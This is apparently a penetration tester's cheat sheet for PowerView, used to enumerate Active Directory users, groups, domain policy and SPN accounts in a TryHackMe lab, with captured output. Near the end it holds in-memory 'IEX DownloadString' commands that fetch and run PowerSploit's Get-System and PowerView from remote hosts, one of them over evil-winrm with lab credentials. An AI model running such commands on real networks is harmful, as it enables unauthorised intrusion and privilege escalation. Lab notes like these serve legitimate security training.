# PowerView
powershell -ep bypass

### [103 functions in PowerView.ps1](#103-functions-in-powerviewps1-1)
```
cat PowerView.ps1 | grep ^funct |nl
gc .\PowerView.ps1 | sls ^func
```
### [Check specific function in PowerShell script](#check-specific-function-in-powershell-script-1)

## [Post-Exploitation Basics](https://tryhackme.com/room/postexploit)

### [Enumerate the domain users with "Get-NetUser | select cn"](#enumerate-the-domain-users-with-get-netuser--select-cn-1)
Set-Alias Get-NetUser Get-DomainUser

### [Enumerate the domain groups with "Get-NetGroup *admin*"](#enumerate-the-domain-groups-with-get-netgroup-admin-1)
Get-NetGroup | select cn
Get-NetGroup *admin*
Get-NetGroup *admin* | select cn

### [Get-NetGroup -UserName Admin2 | select cn](#get-netgroup--username-admin2--select-cn-1)
Get-NetUser | select cn
Get-NetGroup -UserName <username> | select cn

### [Useful cheatsheet from HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### [Get-NetDomain](#get-netdomain-1)

### [Find all users with an SPN set (likely service accounts)](#find-all-users-with-an-spn-set-likely-service-accounts-1)
Get-DomainUser -SPN


### 
```

```


### Examples

### Check specific function in PowerShell script
```
PS C:\> gc .\PowerView.ps1 | sls ^func.*Get-NetUser

function Get-NetUser
```

### Enumerate the domain users with "Get-NetUser | select cn"
"Get-NetUser" produces a lot of output. To only filter "cn", use "select" as follows:
```
PS C:\> Get-NetUser | select cn

cn                  
--
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
ssh
```

PS C:\a> Get-NetUser | select cn, lastlogon

cn                  lastlogon             
--                  ---------
Administrator       9/9/2023 1:03:14 AM
Guest               12/31/1600 4:00:00 PM
krbtgt              12/31/1600 4:00:00 PM
Machine-1           5/14/2020 12:29:48 PM
Admin2              12/31/1600 4:00:00 PM
Machine-2           5/14/2020 12:32:08 PM
SQL Service         12/31/1600 4:00:00 PM
POST{P0W3RV13W_FTW} 12/31/1600 4:00:00 PM
sshd                12/31/1600 4:00:00 PM


### Get-NetGroup -UserName Admin2 | select cn
PS C:\a> Get-NetGroup -UserName Admin2 | select cn

cn
--
Denied RODC Password Replication Group
Enterprise Admins
Schema Admins
Domain Admins
Group Policy Creator Owners
Domain Users


### Out of these 3 hosts, only 1 is responded to ping
PS C:\a> Get-NetComputer | select cn, operatingsystem

cn              operatingsystem                  
--              ---------------
DOMAIN-CONTROLL Windows Server 2019 Standard
DESKTOP-2       Windows 10 Enterprise Evaluation
DESKTOP-1       Windows 10 Enterprise Evaluation


PS C:\a> Get-NetComputer -Ping | select cn

cn              
--
DOMAIN-CONTROLL

### Ping manually
PS C:\a> ping DOMAIN-CONTROLL

Pinging DOMAIN-CONTROLL [10.10.140.5] with 32 bytes of data:
Reply from 10.10.140.5: bytes=32 time<1ms TTL=128
Reply from 10.10.140.5: bytes=32 time<1ms TTL=128

Ping statistics for 10.10.140.5:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
Control-C

PS C:\a> ping DESKTOP-1
Ping request could not find host DESKTOP-1. Please check the name and try again.
PS C:\a>

PS C:\a> ping DESKTOP-2
Ping request could not find host DESKTOP-2. Please check the name and try again.
PS C:\a>

### Enumerate the domain groups with "Get-NetGroup *admin*"
Get-NetGroup -GroupName *admin*
```
PS C:\> Get-NetGroup *admin*
Administrators 
Hyper-V Administrators 
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
PS C:\>
```

### 
```

```

### Get-NetDomain
```
PS C:\a> Get-NetDomain


Forest                  : CONTROLLER.local
DomainControllers       : {Domain-Controller.CONTROLLER.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : Domain-Controller.CONTROLLER.local
RidRoleOwner            : Domain-Controller.CONTROLLER.local
InfrastructureRoleOwner : Domain-Controller.CONTROLLER.local
Name                    : CONTROLLER.local
```

PS C:\a> Get-NetDomainController

Forest                     : CONTROLLER.local
CurrentTime                : 9/9/2023 8:10:25 AM
HighestCommittedUsn        : 57383
OSVersion                  : Windows Server 2019 Standard
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : CONTROLLER.local
IPAddress                  : fe80::154e:df4d:8a15:1ecc%6
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback :
InboundConnections         : {}
OutboundConnections        : {}
Name                       : Domain-Controller.CONTROLLER.local
Partitions                 : {DC=CONTROLLER,DC=local, CN=Configuration,DC=CONTROLLER,DC=local,
                             CN=Schema,CN=Configuration,DC=CONTROLLER,DC=local, DC=DomainDnsZones,DC=CONTROLLER,DC=local...}


PS C:\a> Get-DomainSID
S-1-5-21-849420856-2351964222-986696166
PS C:\a>


PS C:\a> Get-DomainPolicy               


Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=42; MinimumPasswordLength=7; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=0; RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0;
                 ClearTextPassword=0; LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Version        : @{signature="$CHICAGO$"; Revision=1}
Path           : \\CONTROLLER.local\sysvol\CONTROLLER.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Window 
                 s NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy


PS C:\a> (Get-DomainPolicy).SystemAccess


MinimumPasswordAge           : 1
MaximumPasswordAge           : 42
MinimumPasswordLength        : 7
PasswordComplexity           : 1
PasswordHistorySize          : 24
LockoutBadCount              : 0
RequireLogonToChangePassword : 0
ForceLogoffWhenHourExpire    : 0
ClearTextPassword            : 0
LSAAnonymousNameLookup       : 0


PS C:\a> Get-DomainPolicy (Get-DomainPolicy).'System Access'


Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=42; MinimumPasswordLength=7; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=0; RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0;
                 ClearTextPassword=0; LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Version        : @{signature="$CHICAGO$"; Revision=1}
Path           : \\CONTROLLER.local\sysvol\CONTROLLER.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Window 
                 s NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy

Unicode         : @{Unicode=yes} 
RegistryValues  : @{MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=System.Object[];
                  MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=System.Object[];
                  MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=System.Object[];        
                  MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=System.Object[]}
PrivilegeRights : @{SeAssignPrimaryTokenPrivilege=System.Object[]; SeAuditPrivilege=System.Object[];
                  SeBackupPrivilege=System.Object[]; SeBatchLogonRight=System.Object[]; SeChangeNotifyPrivilege=System.Object[];     
                  SeCreatePagefilePrivilege=*S-1-5-32-544; SeDebugPrivilege=*S-1-5-32-544;
                  SeIncreaseBasePriorityPrivilege=System.Object[]; SeIncreaseQuotaPrivilege=System.Object[];
                  SeInteractiveLogonRight=System.Object[]; SeLoadDriverPrivilege=System.Object[];
                  SeMachineAccountPrivilege=*S-1-5-11; SeNetworkLogonRight=System.Object[];
                  SeProfileSingleProcessPrivilege=*S-1-5-32-544; SeRemoteShutdownPrivilege=System.Object[];
                  SeRestorePrivilege=System.Object[]; SeSecurityPrivilege=*S-1-5-32-544; SeShutdownPrivilege=System.Object[];        
                  SeSystemEnvironmentPrivilege=*S-1-5-32-544; SeSystemProfilePrivilege=System.Object[];
                  SeSystemTimePrivilege=System.Object[]; SeTakeOwnershipPrivilege=*S-1-5-32-544; SeUndockPrivilege=*S-1-5-32-544;    
                  SeEnableDelegationPrivilege=*S-1-5-32-544}
Version         : @{signature="$CHICAGO$"; Revision=1}
Path            : \\CONTROLLER.local\sysvol\CONTROLLER.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windo 
                  ws NT\SecEdit\GptTmpl.inf
GPOName         : {6AC1786C-016F-11D2-945F-00C04fB984F9}
GPODisplayName  : Default Domain Controllers Policy



PS C:\a>


### Find all users with an SPN set (likely service accounts)
PS C:\a> Get-DomainUser -SPN | select cn

cn
--
krbtgt
SQL Service




### 103 functions in PowerView.ps1
### gc .\PowerView.ps1 | sls ^func
```
$ cat PowerView.ps1 | grep ^funct |nl
     1  function New-InMemoryModule {
     2  function func {
     3  function Add-Win32Type
     4  function.
     5  function before returning from the attributed method.
     6  function psenum {
     7  function field {
     8  function struct
     9  function Get-IniContent {
    10  function Export-PowerViewCSV {
    11  function Resolve-IPAddress {
    12  function ConvertTo-SID {
    13  function ConvertFrom-SID {
    14  function Convert-ADName {
    15  function ConvertFrom-UACValue {
    16  function Get-PrincipalContext {
    17  function Add-RemoteConnection {
    18  function Remove-RemoteConnection {
    19  function Invoke-UserImpersonation {
    20  function Invoke-RevertToSelf {
    21  function Get-DomainSPNTicket {
    22  function Invoke-Kerberoast {
    23  function Get-PathAcl {
    24  function Convert-LDAPProperty {
    25  function Get-DomainSearcher {
    26  function Convert-DNSRecord {
    27  function Get-DomainDNSZone {
    28  function Get-DomainDNSRecord {
    29  function Get-Domain {
    30  function Get-DomainController {
    31  function Get-Forest {
    32  function Get-ForestDomain {
    33  function Get-ForestGlobalCatalog {
    34  function Get-ForestSchemaClass {
    35  function Find-DomainObjectPropertyOutlier {
    36  function Get-DomainUser {
    37  function New-DomainUser {
    38  function Set-DomainUserPassword {
    39  function Get-DomainUserEvent {
    40  function Get-DomainGUIDMap {
    41  function Get-DomainComputer {
    42  function Get-DomainObject {
    43  function Get-DomainObjectAttributeHistory {
    44  function Get-DomainObjectLinkedAttributeHistory {
    45  function Set-DomainObject {
    46  function ConvertFrom-LDAPLogonHours {
    47  function New-ADObjectAccessControlEntry {
    48  function Set-DomainObjectOwner {
    49  function Get-DomainObjectAcl {
    50  function Add-DomainObjectAcl {
    51  function Remove-DomainObjectAcl {
    52  function Find-InterestingDomainAcl {
    53  function Get-DomainOU {
    54  function Get-DomainSite {
    55  function Get-DomainSubnet {
    56  function Get-DomainSID {
    57  function Get-DomainGroup {
    58  function New-DomainGroup {
    59  function Get-DomainManagedSecurityGroup {
    60  function Get-DomainGroupMember {
    61  function Get-DomainGroupMemberDeleted {
    62  function Add-DomainGroupMember {
    63  function Remove-DomainGroupMember {
    64  function Get-DomainFileServer {
    65  function Get-DomainDFSShare {
    66  function Get-GptTmpl {
    67  function Get-GroupsXML {
    68  function Get-DomainGPO {
    69  function Get-DomainGPOLocalGroup {
    70  function Get-DomainGPOUserLocalGroupMapping {
    71  function Get-DomainGPOComputerLocalGroupMapping {
    72  function Get-DomainPolicyData {
    73  function Get-NetLocalGroup {
    74  function Get-NetLocalGroupMember {
    75  function Get-NetShare {
    76  function Get-NetLoggedon {
    77  function Get-NetSession {
    78  function Get-RegLoggedOn {
    79  function Get-NetRDPSession {
    80  function Test-AdminAccess {
    81  function Get-NetComputerSiteName {
    82  function Get-WMIRegProxy {
    83  function Get-WMIRegLastLoggedOn {
    84  function Get-WMIRegCachedRDPConnection {
    85  function Get-WMIRegMountedDrive {
    86  function Get-WMIProcess {
    87  function Find-InterestingFile {
    88  function New-ThreadedFunction {
    89  function Find-DomainUserLocation {
    90  function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon
    91  function Find-DomainProcess {
    92  function enumerates any current processes running with Get-WMIProcess,
    93  function Find-DomainUserEvent {
    94  function Find-DomainShare {
    95  function Find-InterestingDomainShareFile {
    96  function Find-LocalAdminAccess {
    97  function Find-DomainLocalGroupMember {
    98  function Get-DomainTrust {
    99  function Get-ForestTrust {
   100  function Get-DomainForeignUser {
   101  function Get-DomainForeignGroupMember {
   102  function Get-DomainTrustMapping {
   103  function Get-GPODelegation {
```

### Some more in-memory PS injections
https://gist.github.com/bad-bit/b7157c624a820f3d982e38a8b628f590
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1');
```

# local
```
cd ~/tools
python -m http.server 80
```

# remote
```
evil-winrm -i $ip -u svc-alfresco -p s3rvice
menu
IEX (New-Object Net.WebClient).DownloadString('http://$myip/PowerView.ps1');
menu
```


### 
```

```